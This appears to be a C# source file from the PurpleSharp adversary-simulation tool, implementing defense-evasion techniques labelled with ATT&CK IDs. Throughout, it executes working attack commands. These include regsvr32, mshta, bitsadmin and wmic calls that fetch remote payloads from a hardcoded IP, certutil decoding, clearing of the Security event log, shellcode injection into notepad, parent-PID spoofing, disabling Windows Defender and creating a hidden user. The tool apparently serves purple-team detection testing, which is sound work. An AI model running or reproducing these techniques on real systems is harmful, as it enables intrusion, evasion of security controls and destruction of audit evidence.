using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PurpleSharp.Lib;
using System.IO;
using System.Threading;

namespace PurpleSharp.Simulations
{
    public class DefenseEvasion
    {

        public static void Csmtp(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.003");
            string filePath = playbookTask.filePath;
            if (filePath == null)
            {
                filePath = @"C:\Windows\Temp\files\T1218.003.txt";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format("cmstp /s /ns {0}", filePath), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        static public void Regsvr32(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.010");
            string url = playbookTask.url;
            if (url == null) url =  @"http://100.1.1.169:8080/T1218.010.sct";
            try
            {
                string dll = "scrobj.dll";
                ExecutionHelper.StartProcessApi("", String.Format("regsvr32.exe /u /n /s /i:{0} {1}", url, dll), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void InstallUtil(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.004");
            string filePath = playbookTask.filePath;
            if (filePath == null)
            {
                filePath = @"C:\Windows\Temp\files\T1218.004.exe";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfiles /LogToConsole=alse /U {0}", filePath), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void RegsvcsRegasm(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.009");
            string filePath = playbookTask.filePath;
            if (filePath == null)
            {
                filePath = @"C:\Windows\Temp\files\T1218.009.dll";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U {0}", filePath), logger);
                ExecutionHelper.StartProcessApi("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U {0}", filePath), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void BitsJobs(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1197");
            string filePath = playbookTask.filePath;
            string url = playbookTask.url;
            if (url == null)
            {
                url = @"http://100.1.1.169:8080/T1197.exe";
            }
            if (filePath == null)
            {
                filePath =  @"C:\Windows\Temp\files\T1197.exe";
            }
            
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format("bitsadmin /transfer job /download /priority high {0} {1}", url, filePath), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void Mshta(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.005");
            string url = playbookTask.url;
            if (url == null)
            {
                url = "http://100.1.1.169:8080/T1218.005.hta";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format("mshta {0}", url), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void DeobfuscateDecode(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1140");
            string filePath = playbookTask.filePath;
            if (filePath == null)
            {
                filePath = @"C:\Windows\Temp\files\T1140.txt";
            }
            try
            {
                string pathWithoutExtension = System.IO.Path.ChangeExtension(filePath, null);
        
                // 将路径更改为新的后缀为.exe
                string decoded = pathWithoutExtension + ".exe";
                ExecutionHelper.StartProcessApi("", String.Format("certutil -decode {0} {1}", filePath, decoded), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void XlScriptProcessing(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1220");
            string url = playbookTask.url;
            if (url == null)
            {
                url = "http://100.1.1.169:8080/T1220.xsl";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format("wmic os get /FORMAT:\"{0}\"", url), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void Rundll32(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.011");
            string filePath = playbookTask.filePath;
            if (filePath == null)
            {
                filePath = @"C:\Windows\Temp\files\T1218.011.dll";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format("rundll32 \"{0}\"", filePath), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void ClearSecurityEventLogCmd(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1070.001");
            logger.TimestampInfo("Using the command line to execute the technique");
            string eventType = playbookTask.eventType;
            if (eventType == null)
            {
                eventType = "Security";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", "wevtutil.exe cl " + eventType, logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void ClearSecurityEventLogNET(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1070.001");
            logger.TimestampInfo("Using the System.Diagnostics .NET namespace to execute the technique");
            string eventType = playbookTask.eventType;
            if (eventType == null)
            {
                eventType = "Security";
            }
            try
            {
                EventLog eventlog = new EventLog();
                eventlog.Source = eventType;
                eventlog.Clear();
                eventlog.Close();
                logger.TimestampInfo(String.Format("Cleared the {0} EventLog using .NETs EventLog", eventType));
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                //logger.TimestampInfo(String.Format("Failed to clear the Security EventLog"));
                logger.SimulationFailed(ex);
            }

        }

        public static void PortableExecutableInjection(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1055.002");
            string filePath = playbookTask.filePath;
            string shellcode = playbookTask.shellcode;
            if (filePath == null)
            {
                filePath =  "C:\\Windows\\system32\\notepad.exe";
            }

            if (shellcode == null)
            {
                shellcode = Lib.Static.donut_ping;
            }
            try
            {

                Process proc = new Process();
                proc.StartInfo.FileName = filePath;
                proc.StartInfo.UseShellExecute = false;
                proc.Start();
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} started for the injection", proc.ProcessName, proc.Id));
                Thread.Sleep(1000);
                DefenseEvasionHelper.ProcInjection_CreateRemoteThread(Convert.FromBase64String(shellcode), proc, logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
            
        }

        public static void AsynchronousProcedureCall(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1055.004");
            string filePath = playbookTask.filePath;
            string shellcode = playbookTask.shellcode;
            if (filePath == null)
            {
                filePath =  "C:\\Windows\\system32\\notepad.exe";
            }

            if (shellcode == null)
            {
                shellcode = Static.donut_ping;
            }
            try
            {
                Process proc = new Process();
                proc.StartInfo.FileName = filePath;
                proc.StartInfo.UseShellExecute = false;
                proc.Start();
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} started for the injection", proc.ProcessName, proc.Id));
                Thread.Sleep(1000);
                DefenseEvasionHelper.ProcInjection_APC(Convert.FromBase64String(shellcode), proc, logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void ThreadHijack(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1055.003");
            string filePath = playbookTask.filePath;
            string shellcode = playbookTask.shellcode;
            if (filePath == null)
            {
                filePath =  "C:\\Windows\\system32\\notepad.exe";
            }

            if (shellcode == null)
            {
                shellcode = Lib.Static.donut_ping;
            }
            try
            {

                Process proc = new Process();
                proc.StartInfo.FileName = filePath;
                proc.StartInfo.UseShellExecute = false;
                proc.Start();
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} started for the injection", proc.ProcessName, proc.Id));
                Thread.Sleep(1000);
                DefenseEvasionHelper.ProcInjection_ThreadHijack(Convert.FromBase64String(shellcode), proc, logger);
                logger.SimulationFinished();

            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void ParentPidSpoofing(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1134.004");
            string processName = playbookTask.processName;
            string filePath = playbookTask.filePath;
            if (processName == null)
            {
                processName = "explorer";
            }

            if (filePath == null)
            {
                filePath = @"C:\\WINDOWS\\System32\\notepad.exe";
            }
            try
            {
                Process process = Process.GetProcessesByName(processName).FirstOrDefault();
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} will be used as a parent for the new process", process.ProcessName, process.Id));
                logger.TimestampInfo(String.Format("Spawning notepad.exe as a child process of {0}",process.Id));
                Thread.Sleep(1000);
                Launcher.SpoofParent(process.Id, filePath, Path.GetFileName(filePath));
                logger.SimulationFinished();

            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void DisableWinDefender(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1562.001");
            switch (playbookTask.variation)
            {
                case 1:
                    logger.TimestampInfo("Disable Windows Defender with DISM");
                    ExecutionHelper.StartProcessApi("",
                        @"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet",
                        logger);
                    break;
                case 2:
                    logger.TimestampInfo("Tamper with Windows Defender Registry");
                    string powershellCommand =
                        "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1";
                    ExecutionHelper.StartPowershellNet(powershellCommand, logger);
                    break;
                default:
                    break;
            }
        }

        public static void CreateHiddenUser(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1564.002");
            if (playbookTask.user == null) playbookTask.user = "purple";
            using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
            {
                UserPrincipal user = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, playbookTask.user);

                if (user == null)
                {
                    logger.TimestampInfo("新建用户");
                    PersistenceHelper.CreateUserApi(playbookTask.user, playbookTask.password, logger, false);
                }
                DefenseEvasionHelper.HiddenUser(playbookTask.user, logger);
                
            }

        }
    }
}
